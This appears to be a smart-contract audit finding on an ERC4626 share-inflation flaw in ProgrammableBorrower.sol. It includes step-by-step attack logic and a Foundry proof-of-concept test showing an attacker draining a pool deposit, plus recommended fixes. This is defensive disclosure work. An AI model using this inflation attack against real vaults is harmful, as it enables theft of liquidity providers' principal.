### Title
Unprotected ERC4626 deposit lets a vault depositor steal parked pool funds - ([File: `contracts/strategies/idle/ProgrammableBorrower.sol`](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower` deposits idle credit-vault principal into the configured ERC4626 vault without any minimum-share or post-deposit asset check. A normal ERC4626 depositor can execute the classic share-inflation/donation sequence when the programmable borrower has no existing vault shares, causing the borrower’s deposit to receive zero or near-zero shares while the attacker redeems the donated and deposited assets.

### Finding Description

`ProgrammableBorrower` uses `_depositToVault` to park idle underlying in the configured ERC4626 vault. It calls `vault.deposit(_assetAmount, address(this))` and records the returned share count only in an event. There is no `minShares`, no `convertToShares` sanity bound, and no requirement that the returned shares can later be redeemed for approximately `_assetAmount`. [1](#0-0) 

This path is reached by `onStartEpoch`, which deposits the contract’s entire idle underlying balance after snapshotting total assets. [2](#0-1)  The same primitive is also used for borrower repayments while epoch accounting is active. [3](#0-2) 

A typical attack is:

1. The configured ERC4626 vault has no shares held by `ProgrammableBorrower`.
2. An unprivileged vault user mints the minimum number of vault shares and directly transfers a large amount of underlying to the vault, inflating the asset value per share.
3. `onStartEpoch` deposits pool funds through `_depositToVault`.
4. The vault mints zero shares, or a dust amount, to `ProgrammableBorrower`.
5. The attacker redeems their vault shares and receives the donation plus substantially all of the credit pool’s deposit.

The credit pool then owns economically worthless vault shares. Subsequent `totalInterestDueNow`, `availableToBorrow`, and stop-epoch liquidity are all based on `convertToAssets(vault.balanceOf(address(this)))`, so the stolen principal is permanently missing rather than merely mispriced. [4](#0-3) 

### Impact Explanation

This can cause direct theft of LP principal parked in the programmable borrower. The invariant broken is fair vault minting: depositing `A` underlying should produce shares redeemable for approximately `A`, but `_depositToVault` accepts shares worth zero or nearly zero.

Loss can be up to the full idle balance deposited during `onStartEpoch`, or the full repayment amount redeployed during `_repay`. The resulting shortfall is borne by active tranche holders and pending withdrawal receipts through the vault’s loss/default accounting.

### Likelihood Explanation

Likelihood depends on deployment and vault state:

- The configured ERC4626 vault must be susceptible to donation/share-price inflation, such as an empty vault or a vault where direct asset transfers affect `totalAssets`.
- The programmable borrower must not already hold a sufficiently large share position that dilutes the attack.
- The attacker needs enough capital to donate more than the target deposit, but receives substantially all of that capital back on redemption.
- No privileged Idle role is required. The malicious actor is only an ERC4626 depositor/direct token sender, which is within scope.

The Idle-side guard does not prevent this because `setVault` validates only the vault address and asset, not current share supply, liquidity conditions, or deposit slippage. [5](#0-4) 

### Recommendation

Add explicit share-value protection around every vault deposit:

- Require `vault.deposit` to return at least a caller-provided or internally calculated minimum number of shares.
- Snapshot shares and convertible assets before and after the deposit and revert if the marginal share value deviates beyond an accepted rounding bound.
- Prefer an ERC4626 interface exposing `deposit(assets, receiver, minShares)` or use `mint` with a bounded asset cost.
- Reject vaults whose `totalSupply == 0` unless the programmable borrower performs the first deposit under a controlled initialization flow.
- Consider checking `vault.convertToAssets(mintedShares) >= _assetAmount - allowedDust` after deposit and reverting otherwise, subject to reentrancy/result correctness of the external vault.

### Proof of Concept

A reproducible Foundry test can use a minimal ERC4626 implementation whose `totalAssets` is its underlying balance:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

contract InflatableERC4626 is IERC4626Like {
    ERC20Mock public immutable assetToken;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(ERC20Mock asset_) {
        assetToken = asset_;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply;
        uint256 managed = assetToken.balanceOf(address(this));
        return supply == 0 || managed == 0 ? assets : assets * supply / managed;
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply;
        if (supply == 0) return shares;
        return shares * assetToken.balanceOf(address(this)) / supply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = convertToShares(assets);
        assetToken.transferFrom(msg.sender, address(this), assets);
        balanceOf[receiver] += shares;
        totalSupply += shares;
    }

    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        assets = convertToAssets(shares);
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        assetToken.transfer(receiver, assets);
    }
}

contract ProgrammableBorrowerInflationTest is Test {
    ERC20Mock internal underlying;
    InflatableERC4626 internal vault;
    ProgrammableBorrower internal programmableBorrower;

    address internal attacker = address(0xA11CE);
    uint256 internal poolDeposit = 1_000_000e6;
    uint256 internal attackerSeed = 1;
    uint256 internal attackerDonation = 1_000_000e6;

    function testInflationStealsProgrammableBorrowerDeposit() external {
        underlying.mint(attacker, attackerSeed + attackerDonation);
        underlying.mint(address(programmableBorrower), poolDeposit);

        vm.startPrank(attacker);
        underlying.approve(address(vault), type(uint256).max);

        // Attacker creates the initial share supply, then inflates assets/share.
        vault.deposit(attackerSeed, attacker);
        underlying.transfer(address(vault), attackerDonation);
        vm.stopPrank();

        // IdleCDO hook deposits all idle underlying without minimum shares.
        vm.prank(programmableBorrower.idleCDO());
        programmableBorrower.onStartEpoch(0);

        assertEq(vault.balanceOf(address(programmableBorrower)), 0);

        uint256 attackerBefore = underlying.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(vault.balanceOf(attacker), attacker, attacker);

        assertEq(
            underlying.balanceOf(attacker) - attackerBefore,
            attackerSeed + attackerDonation + poolDeposit
        );
        assertEq(programmableBorrower.totalUnderlying(), 0);
    }
}
```

The exact test wiring should reuse the repository’s existing `ProgrammableBorrower` fixture and mock ERC20. The decisive assertions are that the borrower receives `0` vault shares after depositing `poolDeposit`, while the attacker redeems the donation plus the pool deposit.

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L153-169)
```text
  /// @notice Set the vault used to deploy idle funds.
  /// @dev Owner or manager. This does not migrate an existing position. The operator must first
  /// withdraw from the old vault and wait until epoch accounting is inactive, otherwise assets can
  /// remain stranded there and the live accounting views will stop including them after the switch.
  /// @param _vault new ERC4626 vault address
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
    emit VaultUpdated(_vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L212-219)
```text
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L374-385)
```text
  /// @notice Move a specific amount of idle underlying into the vault.
  /// @param _assetAmount Amount of underlying to deposit
  /// @param _principalAssets Portion of the deposited assets that should extend the epoch principal
  /// baseline instead of being recognized as current-epoch profit.
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L523-528)
```text
    emit Repaid(interestPaid + principalPaid, interestPaid, principalPaid);
    if (epochAccountingActive) {
      // Current-epoch borrower interest must remain visible as profit at stopEpoch, while principal,
      // previously-fronted debt, and any excess repayment should only extend the epoch principal baseline.
      _depositToVault(totalRepaidAssets, totalRepaidAssets - currentEpochInterestPaid);
    } else if (currentEpochInterestPaid != 0) {
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L545-549)
```text
  /// @notice Convert the current vault share position into underlying terms.
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```
